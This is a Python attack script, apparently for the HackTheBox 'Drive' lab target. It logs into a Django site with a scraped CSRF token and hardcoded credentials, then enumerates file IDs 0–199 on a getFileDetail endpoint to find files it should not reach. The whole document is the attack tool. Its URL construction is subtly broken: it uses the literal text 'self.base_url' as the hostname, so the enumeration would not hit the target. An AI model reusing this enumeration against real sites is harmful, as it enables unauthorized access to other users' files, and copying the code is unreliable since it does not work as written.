from scapy.all import *
from termcolor import colored # How to use termcolor -> pypi.org/project/termcolor/

import signal
import sys
import time
import logging
import requests
from pwn import *
import pdb

# re.findall(r'name="csrfmiddlewaretoken" value="(.*?)"', content)[0]

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)




# CTRL + c


#login_url = "http://drive.htb/login/"
#s = requests.session()

class HTBDriveBruteForcer:

    def __init__(self, base_url):
        self.base_url  = base_url
        self.login_url = f"{self.base_url}/login/" 
        self.session = requests.session()
        self.p1 = log.progress(colored(f"bruteForceIds", 'yellow'))
        signal.signal(signal.SIGINT, self.def_handler)
        
        #p1.failure(colored(f"Brute force attack halted (Ctrl + c pressed)", 'red'))

    def def_handler(self, sig, frame):
        print(colored(f"\n\n[!] Exiting...\n", 'red'))
        self.p1.failure(colored(f"Brute force attack halted (Ctrl + c pressed)", 'red'))
        sys.exit(1)


    def getCsrfToken(self):
        r = self.session.get(self.login_url)
        token = re.findall(r'name="csrfmiddlewaretoken" value="(.*?)"', r.text)[0]
        #print(r.text)
        #pdb.set_trace()
        return token

    def login(self, username, password):
        post_data = {
            'csrfmiddlewaretoken': self.getCsrfToken(),
            'username': username,
            'password': password
        }

        r = self.session.post(self.login_url, data=post_data)
        #r = s.get("http://drive.htb/home/")
        #print(r.text)

    def bruteForceIds(self):
        self.p1.status(colored(f"Sending Payload", 'green', attrs=["bold"]))
        time.sleep(5)
        for id in range(0, 200):
            self.p1.status(colored(f"Trying ID [{id}]/200", 'magenta', attrs=["bold"]))
            file_url = f"http://self.base_url/{id}/getFileDetail/"
            r = self.session.get(file_url)
            #print(r.status_code)
            if r.status_code !=500:
                print(colored(f"\n==>[+] FOUND! ID [{id}]: {r.status_code}", 'green', attrs=["bold"]))
        self.p1.success(colored(f"\nSuccess!", 'cyan', attrs=["bold", "blink"]))

if __name__ == '__main__':

    brute_forcer = HTBDriveBruteForcer("http://drive.htb")

    #csrfmiddlewaretoken = getCsrfToken("http://drive.htb")
    brute_forcer.login('foo', '#!P@55w0rd')
    #time.sleep(30)
    #print(csrfmiddlewaretoken)
    brute_forcer.bruteForceIds()